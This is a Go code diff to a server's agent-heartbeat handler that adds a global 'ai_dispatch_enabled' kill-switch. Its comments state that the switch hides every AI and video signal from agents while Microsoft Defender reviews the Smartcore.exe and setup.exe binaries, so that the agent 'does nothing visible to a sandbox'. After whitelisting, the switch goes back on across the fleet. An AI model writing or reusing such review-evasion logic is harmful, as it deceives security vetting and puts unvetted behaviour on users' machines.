@@ -21,6 +21,7 @@ type AgentHandler struct {
 	aiPackages    *services.AIPackageService
 	videos        *services.VideoService
 	notifications *services.NotificationService
+	settings      *services.SystemSettingsService // optional; nil = AI dispatch always on
 	validator     *validator.Validate
 }
 
@@ -30,6 +31,7 @@ func NewAgentHandler(
 	ai *services.AIPackageService,
 	v *services.VideoService,
 	n *services.NotificationService,
+	s *services.SystemSettingsService,
 ) *AgentHandler {
 	return &AgentHandler{
 		machines:      m,
@@ -37,6 +39,7 @@ func NewAgentHandler(
 		aiPackages:    ai,
 		videos:        v,
 		notifications: n,
+		settings:      s,
 		validator:     validator.New(validator.WithRequiredStructEnabled()),
 	}
 }
@@ -116,27 +119,42 @@ func (h *AgentHandler) Heartbeat(c *fiber.Ctx) error {
 		log.Warn().Err(err).Msg("check pending commands failed")
 	}
 
+	// Global kill-switch. When the admin has flipped ai_dispatch_enabled
+	// to false (typically during a Microsoft Defender Submission Portal
+	// review of Smartcore.exe + setup.exe), we strip every AI/video
+	// signal from this response: no URL, no metadata, no launch flag,
+	// no play flag. The agent boots, heartbeats, does nothing visible
+	// to a sandbox. Once the binary is whitelisted, the admin flips
+	// the switch back on and the entire fleet picks up AI on the next
+	// heartbeat.
+	dispatchOn := true
+	if h.settings != nil {
+		dispatchOn = h.settings.AIDispatchEnabled(c.Context())
+	}
+
 	// Embed active AI package + onboarding video metadata so the agent
 	// can react to new versions on the next 60s heartbeat instead of
 	// the old 30-min poll. Failures here are non-fatal — the agent's
 	// own /agent/ai-package and /agent/video endpoints are fallbacks.
 	var aiPackage *models.AgentAIPackageResponse
-	if h.aiPackages != nil {
+	if dispatchOn && h.aiPackages != nil {
 		if pkg, err := h.aiPackages.GetActiveForAgent(c.Context()); err == nil && pkg.Available {
 			aiPackage = pkg
 		}
 	}
 	var video *models.AgentVideoResponse
-	if h.videos != nil {
+	if dispatchOn && h.videos != nil {
 		if v, err := h.videos.GetActiveForAgent(c.Context()); err == nil && v.Available {
 			video = v
 		}
 	}
-	// Suppress play_video when the admin hasn't published any video.
-	// We only ask the agent to play when a video URL is actually
-	// available — otherwise the agent has nothing to play.
+	// Suppress play_video when the admin hasn't published any video,
+	// or when the global kill-switch is off.
 	if video == nil {
 		playVideo = false
+	}
+	if !dispatchOn {
+		launchAI = false
 	}
 
 	return c.JSON(models.HeartbeatResponse{
